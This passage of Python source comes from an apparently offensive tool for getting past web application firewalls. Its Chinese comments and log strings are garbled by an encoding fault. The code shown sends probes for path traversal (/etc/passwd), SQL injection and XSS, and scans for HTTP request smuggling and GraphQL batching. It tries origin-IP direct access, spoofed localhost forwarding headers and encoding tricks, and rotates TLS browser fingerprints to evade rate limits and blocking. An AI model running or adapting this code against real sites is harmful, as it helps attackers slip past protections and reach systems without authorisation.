            # 3. ç‹¬ç«‹æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ‰«æ (åªæ‰«ä¸€æ¬¡)
            smuggling_method = "[ä»£ç†æ¨¡å¼]" if use_proxy else "[ç›´è¿æ¨¡å¼]"
            self.logger.info(f"\n[*] [ç‹¬ç«‹æ‰«æ] æ‰§è¡ŒHTTPè¯·æ±‚èµ°ç§æ¼æ´æ‰«æ {smuggling_method}...")
            smuggling_scan_result = await self.scan_for_smuggling(target_url, use_proxy=use_proxy)
            results['smuggling_scan'] = {
                'vulnerable': smuggling_scan_result.vulnerable,
                'technique': smuggling_scan_result.technique,
                'evidence': smuggling_scan_result.evidence,
                'baseline_status': smuggling_scan_result.baseline_status,
                'confirmation_status': smuggling_scan_result.confirmation_status,
                'baseline_time': smuggling_scan_result.baseline_time,
                'confirmation_time': smuggling_scan_result.confirmation_time
            }
            if smuggling_scan_result.vulnerable:
                self.logger.error(f"[!!!] ç‹¬ç«‹èµ°ç§æ‰«æå‘ç°æ¼æ´: {smuggling_scan_result.technique}")
                self.logger.error(f"[!!!] è¯æ®: {smuggling_scan_result.evidence}")
                results['successful_bypasses'].append({
                    'method': 'http_smuggling_scan',
                    'url': target_url,
                    'confidence': 0.9,
                    'details': vars(smuggling_scan_result)
                })
                self.stats['successful_bypasses'] += 1
            
            # 4. ç‹¬ç«‹æ‰§è¡ŒGraphQLæ‰«æ (åªæ‰«ä¸€æ¬¡)
            graphql_method = "[ä»£ç†æ¨¡å¼]" if use_proxy else "[ç›´è¿æ¨¡å¼]"
            self.logger.info(f"\n[*] [ç‹¬ç«‹æ‰«æ] æ‰§è¡ŒGraphQLæ‰¹å¤„ç†æ¼æ´æ‰«æ {graphql_method}...")
            graphql_scan_result = await self.scan_for_graphql_batching(target_url, use_proxy=use_proxy)
            results['graphql_scan'] = {
                'vulnerable': graphql_scan_result.vulnerable,
                'endpoint': graphql_scan_result.endpoint,
                'evidence': graphql_scan_result.evidence,
                'successful_queries': graphql_scan_result.successful_queries_in_batch,
                'total_queries': graphql_scan_result.total_queries_in_batch,
                'confidence': graphql_scan_result.confidence,
                'introspection_available': graphql_scan_result.introspection_available
            }
            if graphql_scan_result.vulnerable:
                self.logger.error(f"[!!!] ç‹¬ç«‹GraphQLæ‰«æå‘ç°æ¼æ´: {graphql_scan_result.endpoint}")
                self.logger.error(f"[!!!] è¯æ®: {graphql_scan_result.evidence}")
                self.logger.error(f"[!!!] ç½®ä¿¡åº¦: {graphql_scan_result.confidence:.2f}")
                results['successful_bypasses'].append({
                    'method': 'graphql_batch_scan',
                    'url': graphql_scan_result.endpoint or target_url,
                    'confidence': graphql_scan_result.confidence,
                    'details': vars(graphql_scan_result)
                })
                self.stats['successful_bypasses'] += 1
            
            # ====================================================================
            # 5. æ‰§è¡Œç®€å•ç»•è¿‡ç­–ç•¥å¾ªç¯ (é¿å…æ— é™å¾ªç¯)
            # ====================================================================
            simple_strategies = self._build_simple_bypass_strategy(waf_type, aggressive)
            
            self.logger.info(f"\n[*] æ‰§è¡Œç®€å•ç»•è¿‡ç­–ç•¥å¾ªç¯ (å…±{len(simple_strategies)}ç§ç­–ç•¥)...")
            for strategy in simple_strategies:
                result = await self._execute_bypass_strategy_enhanced(target_url, strategy, origin_servers, use_proxy=use_proxy)
                if result.success:
                    # ã€æ•°å­¦æ ¸å¿ƒã€‘åŠ¨æ€é‡æ–°è¯„ä¼°ç½®ä¿¡åº¦
                    original_confidence = result.confidence
                    result.confidence = self.scorer.assess(result, waf_block_page_content="")
                    self.logger.info(f"    [è¯„ä¼°] {result.method}: {original_confidence:.2f} -> {result.confidence:.2f}")
                    
                    results['successful_bypasses'].append({
                        'method': result.method,
                        'url': result.url,
                        'confidence': result.confidence,
                        'details': result.details
                    })
                    self.stats['successful_bypasses'] += 1
                else:
                    results['failed_attempts'].append({
                        'method': result.method,
                        'reason': result.details.get('error', 'Unknown')
                    })
            
            # 6. è®°å½•æµ‹è¯•çš„TLSé…ç½®æ–‡ä»¶
            results['tls_profiles_tested'] = list(self.tls_sessions.keys())
            
            # 7. ç”Ÿæˆå»ºè®®
            results['recommendations'] = self._generate_recommendations(results)
            
        except Exception as e:
            results['error'] = str(e)
            self.logger.error(f"[!] ç»•è¿‡è¿‡ç¨‹å‡ºé”™: {e}")
        
        return results
    
    async def _fingerprint_waf_enhanced(self, url: str, use_proxy: bool = False) -> Optional[str]:
        """å¢å¼ºWAFæŒ‡çº¹è¯†åˆ« - ä½¿ç”¨å¤šæµè§ˆå™¨TLSæŒ‡çº¹"""
        # ä½¿ç”¨ç¼“å­˜
        return await self._cached_operation(
            'waf',
            url,
            self._fingerprint_waf_enhanced_impl,
            url,
            use_proxy
        )
    
    async def _fingerprint_waf_enhanced_impl(self, url: str, use_proxy: bool = False) -> Optional[str]:
        """å¢å¼ºWAFæŒ‡çº¹è¯†åˆ«å®ç° - å¤šæµè§ˆå™¨æ¢æµ‹"""
        # å‘é€å¤šä¸ªæ¢æµ‹è¯·æ±‚ï¼Œä½¿ç”¨ä¸åŒæµè§ˆå™¨æŒ‡çº¹
        probes = [
            {'path': '/', 'method': 'GET', 'profile': 'chrome_120'},
            {'path': '/../../etc/passwd', 'method': 'GET', 'profile': 'firefox_119'},  # è·¯å¾„éå†
            {'path': '/?id=1\'', 'method': 'GET', 'profile': 'safari_17'},  # SQLæ³¨å…¥
            {'path': '/', 'method': 'TRACE', 'profile': 'edge_120'},  # æ–¹æ³•æ¢æµ‹
            {'path': '/<script>alert(1)</script>', 'method': 'GET', 'profile': 'opera_105'}  # XSS
        ]
        
        detected_wafs = defaultdict(int)
        
        for probe in probes:
            try:
                target = url.rstrip('/') + probe['path']
                
                # ä½¿ç”¨TLS-Clientå‘é€è¯·æ±‚
                resp = await self._make_tls_request(
                    target,
                    method=probe['method'],
                    profile=probe['profile'],
                    use_proxy=use_proxy,
                    allow_redirects=False
                )
                
                headers = resp['headers']
                text = resp['text']
                server = headers.get('Server', '').lower()
                
                # æ£€æŸ¥æ¯ä¸ªWAFçš„ç‰¹å¾
                for waf_name, signatures in self.waf_signatures.items():
                    score = 0
                    
                    # æ£€æŸ¥å“åº”å¤´
                    for header in signatures.get('headers', []):
                        if any(h.lower() == header.lower() for h in headers):
                            score += 2
                    
                    # æ£€æŸ¥é”™è¯¯ä¿¡æ¯
                    for error in signatures.get('errors', []):
                        if error.lower() in text.lower():
                            score += 3
                    
                    # æ£€æŸ¥Serverå¤´
                    for server_sig in signatures.get('server', []):
                        if server_sig.lower() in server:
                            score += 2
                    
                    if score > 0:
                        detected_wafs[waf_name] += score
                        self.logger.info(f"    [WAF] {waf_name} å¾—åˆ†: +{score} (ä½¿ç”¨: {probe['profile']})")
            
            except Exception as e:
                self.logger.warning(f"    [!] æ¢æµ‹å¤±è´¥ ({probe['profile']}): {e}")
                continue
        
        # è¿”å›å¾—åˆ†æœ€é«˜çš„WAF
        if detected_wafs:
            best_waf = max(detected_wafs.items(), key=lambda x: x[1])
            self.logger.info(f"[+] WAFè¯†åˆ«ç»“æœ: {best_waf[0]} (æ€»åˆ†: {best_waf[1]})")
            return best_waf[0]
        
        return None
    
    async def _execute_bypass_strategy_enhanced(self, url: str, strategy: Dict, 
                                             origin_servers: List[OriginServer], use_proxy: bool = False) -> BypassResult:
        """å¢å¼ºç­–ç•¥æ‰§è¡Œ - TLS-Clientå¤šæŒ‡çº¹è½®æ¢"""
        try:
            self.logger.info(f"[*] å°è¯•ç»•è¿‡æ–¹æ³•: {strategy['name']} (TLS-Clientå¢å¼º)")
            
            # ä¸ºä¸åŒç­–ç•¥é€‰æ‹©æœ€ä¼˜æµè§ˆå™¨æŒ‡çº¹
            optimal_profiles = self._select_optimal_profiles(strategy['name'])
            
            # æ™ºèƒ½æŒ‡çº¹è½®æ¢ - é˜²æ­¢è¢«å°
            for attempt in range(len(optimal_profiles)):
                # ä½¿ç”¨æ™ºèƒ½è½®æ¢é€‰æ‹©æœ€ä½³æŒ‡çº¹
                profile = self._get_optimal_profile_with_rotation(strategy['name'])
                profile_desc = self.browser_profiles.get(profile, {}).get('description', profile)
                self.logger.info(f"    [*] ä½¿ç”¨æµè§ˆå™¨æŒ‡çº¹: {profile_desc} (å°è¯• {attempt + 1})")
                
                try:
                    if strategy['name'] == 'direct_origin':
                        result = await self._bypass_via_origin_ip_enhanced(url, origin_servers, profile, use_proxy)
                    elif strategy['name'] == 'header_manipulation':
                        result = await self._bypass_via_headers_enhanced(url, profile, use_proxy)
                    elif strategy['name'] == 'encoding_bypass':
                        result = await self._bypass_via_encoding_enhanced(url, profile, use_proxy)
                    else:
                        # ä¼ ç»Ÿæ–¹æ³•ä½œä¸ºå¤‡ç”¨
                        if strategy['name'] == 'direct_origin':
                            result = await strategy['function'](url, origin_servers)
                        else:
                            result = await strategy['function'](url)
                    
                    # è®°å½•ä½¿ç”¨ç»“æœ
                    self._record_profile_result(profile, result.success, 
                                              result.details.get('error'))
                    
                    # å¦‚æœæˆåŠŸï¼Œè®°å½•ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹
                    if result.success:
                        result.details['browser_profile'] = profile
                        result.details['tls_enhanced'] = True
                        result.details['rotation_attempt'] = attempt + 1
                        self.logger.info(f"[+] ç»•è¿‡æˆåŠŸ: {strategy['name']} (æŒ‡çº¹: {profile})")
                        return result
                    else:
                        self.logger.warning(f"    [-] {profile} å¤±è´¥: {result.details.get('error', 'æœªçŸ¥åŸå› ')}")
                        
                        # å¦‚æœæ˜¯è¢«å°è¿¹è±¡ï¼Œç«‹å³è½®æ¢åˆ°ä¸‹ä¸€ä¸ªæŒ‡çº¹
                        error_msg = result.details.get('error', '')
                        if any(sign in error_msg.lower() for sign in ['blocked', 'rate limit']):
                            self.logger.warning(f"    [!] æ£€æµ‹åˆ°å°ç¦è¿¹è±¡ï¼Œç«‹å³è½®æ¢æŒ‡çº¹")
                            self.profile_rotation['blocked_profiles'].add(profile)
                
                except Exception as e:
                    error_str = str(e)
                    self._record_profile_result(profile, False, error_str)
                    self.logger.error(f"    [!] æŒ‡çº¹ {profile} æ‰§è¡Œå¼‚å¸¸: {type(e).__name__} - {e}")
                    continue
            
            # æ‰€æœ‰æŒ‡çº¹éƒ½å¤±è´¥
            return BypassResult(
                success=False,
                method=strategy['name'],
                url=url,
                details={'error': f'æ‰€æœ‰æµè§ˆå™¨æŒ‡çº¹å‡å¤±è´¥ï¼Œå…±æµ‹è¯•{len(optimal_profiles)}ä¸ªæŒ‡çº¹'}
            )
            
        except Exception as e:
            self.logger.error(f"[!] å¢å¼ºç­–ç•¥æ‰§è¡Œå¤±è´¥ {strategy['name']}: {type(e).__name__} - {e}")
            return BypassResult(
                success=False,
                method=strategy['name'],
                url=url,
                details={'error': f'ç­–ç•¥æ‰§è¡Œå¼‚å¸¸: {type(e).__name__} - {str(e)}'}
            )
    
    def _select_optimal_profiles(self, strategy_name: str) -> List[str]:
        """ä¸ºä¸åŒç­–ç•¥é€‰æ‹©æœ€ä¼˜æµè§ˆå™¨æŒ‡çº¹ - 10ç§æŒ‡çº¹æ™ºèƒ½é€‰æ‹©"""
        # æ ¹æ®ç­–ç•¥ç±»å‹é€‰æ‹©æœ€ä½³æµè§ˆå™¨æŒ‡çº¹ç»„åˆ
        profile_strategies = {
            # æºç«™ç›´è¿ - ç°ä»£+ç§»åŠ¨ç«¯ (å®¹æ˜“è¢«ä¿¡ä»»)
            'direct_origin': ['chrome_120', 'firefox_119', 'safari_ios'],
            
            # å¤´éƒ¨æ“çºµ - æ—§ç‰ˆ+ç‰¹æ®Š (ç»•è¿‡ç°ä»£æ£€æµ‹)
            'header_manipulation': ['chrome_112', 'firefox_102', 'okhttp'],
            
            # ç¼–ç ç»•è¿‡ - æ··åˆç­–ç•¥ (è¦†ç›–ä¸åŒè§£æå™¨)
            'encoding_bypass': ['opera_105', 'chrome_android', 'edge_120'],
            
            # WebSocket - ç°ä»£æµè§ˆå™¨ (åè®®æ”¯æŒå¥½)
            'websocket': ['chrome_120', 'firefox_119', 'safari_17'],
            
            # GraphQL - ç§»åŠ¨+ç°ä»£ (APIå®¢æˆ·ç«¯å¸¸è§)
            'graphql': ['chrome_android', 'okhttp', 'chrome_120'],
            
            # ç¼“å­˜æŠ•æ¯’ - æ—§ç‰ˆ+ç½•è§ (ç»•è¿‡ç¼“å­˜æŒ‡çº¹æ£€æµ‹)
            'cache_poison': ['firefox_102', 'opera_105', 'chrome_112'],
            
            # åè®®æ··æ·† - æ—§ç‰ˆæµè§ˆå™¨ (åè®®å¤„ç†å·®å¼‚)
            'protocol_confusion': ['chrome_112', 'firefox_102'],
            
            # è¾¹ç¼˜æ¡ˆä¾‹ - ç‰¹æ®Š+ç§»åŠ¨ (è§£æå™¨å·®å¼‚å¤§)
            'edge_cases': ['okhttp', 'safari_ios', 'chrome_android'],
            
            # é»˜è®¤ç­–ç•¥ - å¹³è¡¡è¦†ç›–
            'default': ['chrome_120', 'firefox_119', 'safari_17', 'chrome_android']
        }
        
        selected = profile_strategies.get(strategy_name, profile_strategies['default'])
        
        # è¿‡æ»¤æ‰æœªåˆå§‹åŒ–æˆåŠŸçš„æŒ‡çº¹
        available_profiles = [p for p in selected if p in self.tls_sessions]
        
        # å¦‚æœæ²¡æœ‰å¯ç”¨çš„ï¼Œå›é€€åˆ°åŸºç¡€æŒ‡çº¹
        if not available_profiles:
            available_profiles = ['chrome_120', 'firefox_119']
            available_profiles = [p for p in available_profiles if p in self.tls_sessions]
        
        return available_profiles
    
    def _get_optimal_profile_with_rotation(self, strategy_name: str) -> str:
        """æ™ºèƒ½æŒ‡çº¹è½®æ¢ - é˜²æ­¢è¢«WAFå°ç¦"""
        # è·å–ç­–ç•¥å¯¹åº”çš„æŒ‡çº¹åˆ—è¡¨
        candidate_profiles = self._select_optimal_profiles(strategy_name)
        
        # è¿‡æ»¤æ‰è¢«å°çš„æŒ‡çº¹
        available_profiles = [p for p in candidate_profiles if p not in self.profile_rotation['blocked_profiles']]
        
        if not available_profiles:
            # å¦‚æœæ‰€æœ‰æŒ‡çº¹éƒ½è¢«å°ï¼Œé‡ç½®å°ç¦åˆ—è¡¨
            self.logger.warning("[!] æ‰€æœ‰æŒ‡çº¹è¢«å°ï¼Œé‡ç½®å°ç¦åˆ—è¡¨")
            self.profile_rotation['blocked_profiles'].clear()
            available_profiles = candidate_profiles
        
        # é€‰æ‹©æˆåŠŸç‡æœ€é«˜ä¸”ä½¿ç”¨æ¬¡æ•°è¾ƒå°‘çš„æŒ‡çº¹
        best_profile = None
        best_score = -1
        
        for profile in available_profiles:
            if profile not in self.tls_sessions:
                continue
                
            # è®¡ç®—ç»¼åˆè¯„åˆ†ï¼šæˆåŠŸç‡ - ä½¿ç”¨é¢‘ç‡æƒ©ç½š
            success_rate = (self.stats['profile_success'][profile] / 
                          max(self.stats['profile_usage'][profile], 1))
            usage_penalty = self.stats['profile_usage'][profile] * 0.1
            score = success_rate - usage_penalty
            
            if score > best_score:
                best_score = score
                best_profile = profile
        
        # å¦‚æœæ²¡æœ‰æ‰¾åˆ°æœ€ä½³çš„ï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªå¯ç”¨çš„
        if not best_profile:
            best_profile = available_profiles[0] if available_profiles else 'chrome_120'
        
        # æ›´æ–°è½®æ¢è®¡æ•°
        self.profile_rotation['rotation_count'] += 1
        
        return best_profile
    
    def _record_profile_result(self, profile: str, success: bool, error: str = None):
        """è®°å½•æŒ‡çº¹ä½¿ç”¨ç»“æœ"""
        self.stats['profile_usage'][profile] += 1
        
        if success:
            self.stats['profile_success'][profile] += 1
        else:
            # æ£€æŸ¥æ˜¯å¦æ˜¯è¢«å°çš„è¿¹è±¡
            if error and any(blocked_sign in error.lower() for blocked_sign in 
                           ['blocked', 'banned', 'rate limit', 'too many requests']):
                self.logger.warning(f"[!] æŒ‡çº¹ {profile} å¯èƒ½è¢«å°ï¼ŒåŠ å…¥é»‘åå•")
                self.profile_rotation['blocked_profiles'].add(profile)
        
        # æ›´æ–°æˆåŠŸç‡
        total_uses = self.stats['profile_usage'][profile]
        success_count = self.stats['profile_success'][profile]
        self.profile_rotation['success_rates'][profile] = success_count / total_uses
    
    async def _bypass_via_origin_ip_enhanced(self, url: str, origin_servers: List[OriginServer], 
                                           profile: str, use_proxy: bool = False) -> BypassResult:
        """TLS-Clientå¢å¼ºçš„æºç«™ç›´è¿ç»•è¿‡"""
        if not origin_servers:
            return BypassResult(
                success=False,
                method='direct_origin_enhanced',
                url=url,
                details={'error': 'No origin servers found'}
            )
        
        domain = self._extract_domain(url)
        
        for server in origin_servers:
            if server.confidence < 0.5:
                continue
                
            try:
                # æ„å»ºç›´è¿URL
                parsed = urllib.parse.urlparse(url)
                direct_url = f"{parsed.scheme}://{server.ip}{parsed.path}"
                if parsed.query:
                    direct_url += f"?{parsed.query}"
                
                # ä½¿ç”¨TLS-Clientæµ‹è¯•ç›´è¿
                resp = await self._make_tls_request(
                    direct_url,
                    headers={'Host': domain},
                    profile=profile,
                    use_proxy=use_proxy
                )
                
                if resp['status_code'] == 200:
                    content = resp['text']
                    # å¢å¼ºéªŒè¯ï¼šæ£€æŸ¥ç›®æ ‡æŒ‡çº¹åŒ¹é…
                    if self._verify_target_match(content):
                        result = BypassResult(
                            success=True,
                            method='direct_origin_enhanced',
                            url=direct_url,
                            details={
                                'origin_ip': server.ip,
                                'confidence': server.confidence,
                                'discovery_method': server.discovery_method,
                                'browser_profile': profile,
                                'fingerprint_verified': True,
                                'content': content,
                                'headers': resp.get('headers', {})
                            },
                            confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                            risk_level='high'
                        )
                        # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                        result.confidence = self.scorer.assess(result)
                        return result
            except Exception as e:
                # è®°å½•è¯¦ç»†çš„å¤±è´¥ä¿¡æ¯
                error_detail = f"{type(e).__name__}: {str(e)[:100]}"
                self.logger.warning(f"    [!] ç›´è¿{server.ip}å¤±è´¥: {error_detail}")
                # å°†é”™è¯¯ä¿¡æ¯æ·»åŠ åˆ°æœåŠ¡å™¨è®°å½•ä¸­ï¼Œç”¨äºæœ€ç»ˆçš„é”™è¯¯è¯¦æƒ…
                if not hasattr(server, 'failure_details'):
                    server.failure_details = []
                server.failure_details.append(error_detail)
                continue
        
        # æ”¶é›†æ¯ä¸ªæœåŠ¡å™¨çš„å¤±è´¥è¯¦æƒ…
        server_failures = []
        for server in origin_servers:
            failure_info = {
                'ip': server.ip,
                'confidence': server.confidence,
                'discovery_method': server.discovery_method
            }
            if hasattr(server, 'failure_details'):
                failure_info['errors'] = server.failure_details
            else:
                failure_info['errors'] = ['ç½®ä¿¡åº¦è¿‡ä½ï¼Œæœªå°è¯•è¿æ¥']
            server_failures.append(failure_info)
        
        return BypassResult(
            success=False,
            method='direct_origin_enhanced',
            url=url,
            details={
                'error': f'æ‰€æœ‰æºç«™ç›´è¿å°è¯•å¤±è´¥ï¼Œå…±æµ‹è¯•{len(origin_servers)}ä¸ªæºç«™IP',
                'tested_servers': server_failures,
                'confidence_threshold': 0.5,
                'failure_reason': 'connection_failures_or_content_mismatch'
            }
        )
    
    async def _bypass_via_headers_enhanced(self, url: str, profile: str, use_proxy: bool = False) -> BypassResult:
        """TLS-Clientå¢å¼ºçš„è¯·æ±‚å¤´ç»•è¿‡"""
        # é’ˆå¯¹10ç§æµè§ˆå™¨ä¼˜åŒ–çš„å¤´éƒ¨ç»„åˆ - æè‡´ä¼ªè£…
        profile_specific_headers = {
            # ç°ä»£æ¡Œé¢æµè§ˆå™¨
            'chrome_120': {
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1'
            },
            'firefox_119': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Upgrade-Insecure-Requests': '1'
            },
            'safari_17': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            },
            'edge_120': {
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
            },
            'opera_105': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="105", "Opera";v="105"'
            },
            
            # ç§»åŠ¨ç«¯æµè§ˆå™¨å¤´éƒ¨
            'chrome_android': {
                'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': '"Android"',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'X-Requested-With': 'com.android.browser'
            },
            'safari_ios': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'X-Requested-With': 'Mobile Safari'
            },
            
            # æ—§ç‰ˆæµè§ˆå™¨å¤´éƒ¨ (ç»•è¿‡ç°ä»£æ£€æµ‹)
            'chrome_112': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Sec-Ch-Ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"'
            },
            'firefox_102': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',  # æ³¨æ„ï¼šæ—§ç‰ˆä¸æ”¯æŒbr
                'DNT': '1'
            },
            
            # ç‰¹æ®Šå®¢æˆ·ç«¯å¤´éƒ¨
            'okhttp': {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip',
                'Connection': 'Keep-Alive',
                'User-Agent': 'okhttp/4.10.0'  # Androidåº”ç”¨å¸¸è§
            }
        }
        
        # è·å–æµè§ˆå™¨ç‰¹å®šå¤´éƒ¨
        browser_headers = profile_specific_headers.get(profile, {})
        
        # æµ‹è¯•å¤´éƒ¨ç»„åˆ
        test_header_sets = [
            # åŸºç¡€ç»•è¿‡å¤´ + æµè§ˆå™¨ç‰¹å®šå¤´
            {**self.bypass_headers, **browser_headers},
            # ä»…æµè§ˆå™¨å¤´
            browser_headers,
            # é«˜çº§ç»•è¿‡å¤´ç»„åˆ
            {
                **browser_headers,
                'X-Originating-IP': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1,10.0.0.1',
                'X-Real-IP': '10.0.0.1',
                'X-Forwarded-Host': 'localhost'
            }
        ]
        
        for i, headers in enumerate(test_header_sets):
            try:
                resp = await self._make_tls_request(
                    url,
                    headers=headers,
                    profile=profile,
                    use_proxy=use_proxy
                )
                
                if resp['status_code'] in [200, 301, 302]:
                    content = resp['text']
                    
                    # æ£€æŸ¥ç»•è¿‡æˆåŠŸæ ‡å¿—
                    if not any(waf_sig in content.lower() 
                             for waf_sig in ['cloudflare', 'access denied', 'forbidden', 'blocked']):
                        # éªŒè¯ç›®æ ‡åŒ¹é…
                        if self._verify_target_match(content):
                            result = BypassResult(
                                success=True,
                                method='header_manipulation_enhanced',
                                url=url,
                                details={
                                    'headers_used': headers,
                                    'browser_profile': profile,
                                    'header_set': i + 1,
                                    'tls_enhanced': True,
                                    'content': content,
                                    'headers': resp.get('headers', {})
                                },
                                confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                risk_level='high'
                            )
                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                            result.confidence = self.scorer.assess(result)
                            return result
                        
            except Exception as e:
                self.logger.warning(f"    [!] å¤´éƒ¨ç»•è¿‡å¤±è´¥ (set {i+1}): {type(e).__name__} - {e}")
                continue
        
        return BypassResult(
            success=False,
            method='header_manipulation_enhanced',
            url=url,
            details={
                'error': f'æ‰€æœ‰å¤´éƒ¨æ“çºµç»„åˆå¤±è´¥ï¼Œä½¿ç”¨æµè§ˆå™¨æŒ‡çº¹: {profile}',
                'browser_profile': profile,
                'header_sets_tested': len(test_header_sets),
                'failure_reason': 'header_bypass_blocked_or_detected'
            }
        )
    
    async def _bypass_via_encoding_enhanced(self, url: str, profile: str, use_proxy: bool = False) -> BypassResult:
        """TLS-Clientå¢å¼ºçš„ç¼–ç ç»•è¿‡"""
        parsed = urllib.parse.urlparse(url)
        
        # é’ˆå¯¹10ç§æµè§ˆå™¨ç‰¹æ€§çš„ç¼–ç ç­–ç•¥ - æè‡´ä¼˜åŒ–
        browser_encoding_strategies = {
            # ç°ä»£æµè§ˆå™¨ - æ ‡å‡†ç¼–ç æ–¹å¼
            'chrome_120': ['url', 'unicode', 'mixed_case'],
            'firefox_119': ['utf8_overlong', 'double_url', 'hex'],
            'safari_17': ['html_entity', 'base64', 'url'],
            'edge_120': ['unicode', 'mixed_case', 'double_url'],
            'opera_105': ['utf8_overlong', 'html_entity', 'hex'],
            
            # ç§»åŠ¨ç«¯æµè§ˆå™¨ - ç§»åŠ¨ç«¯ç‰¹æ€§ç¼–ç 
            'chrome_android': ['url', 'hex', 'unicode'],  # Androidå…¼å®¹æ€§å¥½
            'safari_ios': ['base64', 'html_entity', 'url'],  # iOSä¸¥æ ¼è§£æ
            
            # æ—§ç‰ˆæµè§ˆå™¨ - åˆ©ç”¨è§£æå·®å¼‚
            'chrome_112': ['double_url', 'mixed_case', 'utf8_overlong'],  # æ—§Chromeè§£æå®½æ¾
            'firefox_102': ['hex', 'unicode', 'html_entity'],  # æ—§Firefoxç‰¹æ€§
            
            # ç‰¹æ®Šå®¢æˆ·ç«¯ - ç®€å•ç¼–ç é¿å…è§£æé”™è¯¯
            'okhttp': ['url', 'hex']  # OkHttpè§£æç®€å•
        }
        
        encoding_methods = browser_encoding_strategies.get(profile, ['url', 'unicode', 'mixed_case'])
        
        # æµ‹è¯•è·¯å¾„ç¼–ç 
        for encoding_name in encoding_methods:
            if encoding_name not in self.encoders:
                continue
                
            encoder_func = self.encoders[encoding_name]
            
            # ç¼–ç è·¯å¾„
            if parsed.path and len(parsed.path) > 1:
                try:
                    encoded_path = encoder_func(parsed.path)
                    encoded_url = f"{parsed.scheme}://{parsed.netloc}{encoded_path}"
                    if parsed.query:
                        encoded_url += f"?{parsed.query}"
                    
                    # ä½¿ç”¨TLS-Clientæµ‹è¯•
                    resp = await self._make_tls_request(
                        encoded_url,
                        profile=profile,
                        use_proxy=use_proxy
                    )
                    
                    if resp['status_code'] == 200:
                        content = resp['text']
                        if self._verify_target_match(content):
                            result = BypassResult(
                                success=True,
                                method='encoding_bypass_enhanced',
                                url=encoded_url,
                                details={
                                    'encoding': encoding_name,
                                    'browser_profile': profile,
                                    'encoded_path': encoded_path,
                                    'tls_enhanced': True,
                                    'content': content,
                                    'headers': resp.get('headers', {})
                                },
                                confidence=0.5,  # ä¸´æ—¶å€¼ï¼Œç«‹å³é‡æ–°è¯„ä¼°
                                risk_level='medium'
                            )
                            # ã€æ•°å­¦å¼•æ“ã€‘åŠ¨æ€ç½®ä¿¡åº¦è¯„ä¼°
                            result.confidence = self.scorer.assess(result)
                            return result
                            
                except Exception as e:
                    self.logger.warning(f"    [!] ç¼–ç ç»•è¿‡å¤±è´¥ ({encoding_name}): {type(e).__name__} - {e}")
                    continue
        
        return BypassResult(
            success=False,
            method='encoding_bypass_enhanced',
            url=url,
            details={
                'error': f'æ‰€æœ‰ç¼–ç ç»•è¿‡æ–¹æ³•å¤±è´¥ï¼Œä½¿ç”¨æµè§ˆå™¨æŒ‡çº¹: {profile}',
                'browser_profile': profile,
                'encoding_methods_tested': encoding_methods,
                'failure_reason': 'encoding_bypass_blocked_or_unsupported'
            }
        )
    
    def _verify_target_match(self, content: str) -> bool:
        """éªŒè¯å“åº”å†…å®¹æ˜¯å¦åŒ¹é…ç›®æ ‡ç«™ç‚¹æŒ‡çº¹"""
        if not hasattr(self, '_target_fingerprint'):
            return True  # å¦‚æœæ²¡æœ‰æŒ‡çº¹ï¼Œé»˜è®¤é€šè¿‡
        
        fp = self._target_fingerprint
        match_score = 0.0
        
        # æ ‡é¢˜åŒ¹é…
        if fp['title']:
            title_match = re.search(r'<title[^>]*>(.*?)</title>', content, re.IGNORECASE)
            if title_match and title_match.group(1).strip() == fp['title']:
                match_score += 0.4
        
        # é™æ€èµ„æºåŒ¹é…
        if fp['static_resources']:
            matched_resources = sum(1 for resource in fp['static_resources'] if resource in content)
            if fp['static_resources']:
                match_score += (matched_resources / len(fp['static_resources'])) * 0.3
        
        # DOMæ¨¡å¼åŒ¹é…
        if fp['dom_patterns']:
